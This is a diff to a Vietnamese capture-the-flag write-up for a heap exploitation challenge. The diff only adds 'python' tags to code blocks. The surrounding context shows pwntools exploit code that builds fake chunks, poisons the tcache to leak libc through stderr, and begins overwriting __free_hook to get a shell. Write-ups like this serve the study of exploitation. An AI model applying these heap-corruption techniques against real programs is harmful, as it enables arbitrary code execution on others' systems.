@@ -32,7 +32,7 @@
   - chunk 3 đưa fakechunk vào để có thể free vào chunk mong muốn ( ở đây là chunk chứa libc)
   - chunk 4 cũng là fakechunk để ta có thể control được ptr vì chương trình đã giới hạn việc free.
   - setup các chunk
-  ```
+  ```python
   payload = p64(stderr) + b'\x00'*16 + p64(0x31) + p64(stderr) + b'\x00'*32 + p64(0x41) + p64(name_addr + 16) + b'\x00'*48 + p64(0x51) + p64(name_addr + 16)
 
   malloc(size_, payload)
@@ -44,7 +44,7 @@
   - ![image](https://user-images.githubusercontent.com/113702087/220079920-00e4a33c-1fc8-4b36-a435-32a44e3e3f61.png)
   - ![image](https://user-images.githubusercontent.com/113702087/220081175-9c7c37e6-f9d1-4c71-999e-2e3d788289c4.png)
   - thay đổi size libc_stderr và đưa vào tcache_c
-  ```
+  ```python
   payload = b'\x00'*40 + p64(0x91)
   malloc(size_, payload)
   malloc(size_ + 24, b'\x87')
@@ -52,13 +52,13 @@
   ```
   - ![image](https://user-images.githubusercontent.com/113702087/220081883-10198633-7bb4-4635-b8cb-092b55a79ee3.png)
   - Sau khi đưa libc_stderr vào tcache ta free(fakechunk) tcache 0x90: `fakechunk->libc_stderr`
-  ```
+  ```python
   malloc(size_ + 40, b'a')
 malloc(size_ + 40, b'a')
 freeandinfo(b'2')
   ```
   - ![image](https://user-images.githubusercontent.com/113702087/220082718-35ee95cc-6b5b-40b2-8d54-055eb2a4ebec.png)
-  ```
+  ```python
   freeandinfo(b'3')
 r.recvuntil(b'Name :')
 r.recv(16)
@@ -67,7 +67,7 @@ libc.address = u64(out) - 0x3ec680
 print(hex(libc.address))
   ```
  ### Overwrite free_hook và lấy shell
-  ```
+  ```python
   malloc(size_ + 56, b'a')
 malloc(size_ + 56, p64(libc.sym['__free_hook']))
 malloc(size_ + 120, b'a')
